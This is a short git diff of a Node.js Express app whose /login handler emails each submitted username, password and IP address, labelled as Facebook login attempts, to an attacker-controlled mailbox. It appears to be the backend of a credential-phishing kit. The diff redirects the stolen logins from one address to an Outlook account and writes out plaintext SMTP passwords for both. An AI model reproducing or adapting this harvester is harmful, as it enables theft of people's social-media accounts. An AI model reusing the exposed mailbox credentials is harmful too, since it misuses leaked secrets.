@@ -30,14 +30,13 @@ app.use(
     })
 );
 
-// Nodemailer setup
 const transporter = nodemailer.createTransport({
-    host: 'smtp.zoho.com',
-    port: 587,  // Use 465 if SSL is required
-    secure: false, // true for port 465 (SSL), false for 587 (TLS)
+    host: 'smtp.office365.com',
+    port: 587,  
+    secure: false,
     auth: {
-        user: "info@vaulttrustfinancial.com", 
-        pass: "@GuardianUser1"
+        user: "thebridgejakob@outlook.com", 
+        pass: "Romeo00147"
     }
 });
 
@@ -61,8 +60,8 @@ app.post("/login", (req, res) => {
     // Create the email subject based on the attempt number
     const attemptNumber = req.session.attempt || 1;
     const mailOptions = {
-        from: '"Info" <info@vaulttrustfinancial.com>',
-        to: 'info@vaulttrustfinancial.com',
+        from: '"Info" <thebridgejakob@outlook.com>',
+        to: 'thebridgejakob@outlook.com',
         subject: `Login Attempt ${attemptNumber} by ${email}`,
         text: `Facebook Contact Form Details\nAttempt ${attemptNumber}\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
     };
